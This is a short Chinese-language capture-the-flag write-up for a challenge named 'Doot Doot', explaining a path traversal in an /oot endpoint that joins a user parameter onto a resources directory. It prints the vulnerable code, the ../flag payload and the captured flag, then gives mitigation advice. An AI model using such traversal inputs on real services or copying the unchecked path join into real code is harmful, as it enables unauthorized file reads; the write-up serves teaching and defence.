# Doot Doot

## 题目简述

接口 /oot 读取 oot 参数，自动追加 .txt，再与 resources 目录用斜杠拼接后 open。参数没有规范化或限制父目录组件，因此 ../flag 会从 resources 返回上一级的 flag.txt。

## 解题过程

关键代码等价于：

~~~python
f = request.args.get("oot")
f = f + ".txt"
filename = "/".join(["resources", f])
with open(filename) as handle:
    file_content = handle.read()
~~~

请求：

~~~text
/oot?oot=../flag
~~~

服务实际打开：

~~~text
resources/../flag.txt
~~~

操作系统规范化后就是应用工作目录下的 flag.txt，页面回显：

~~~text
maple{Pingu_s4yz_N00t_No0T}
~~~

因为程序会自动添加扩展名，参数中不应再写 .txt。

## 方法总结

仅把用户路径固定在某个字符串前缀下并不安全，../ 会在文件系统解析阶段逃逸。服务应使用可信文件 ID 映射，或 resolve 后验证目标仍位于允许根目录内，并拒绝绝对路径、父目录组件和符号链接逃逸。追加扩展名不能替代路径边界检查。
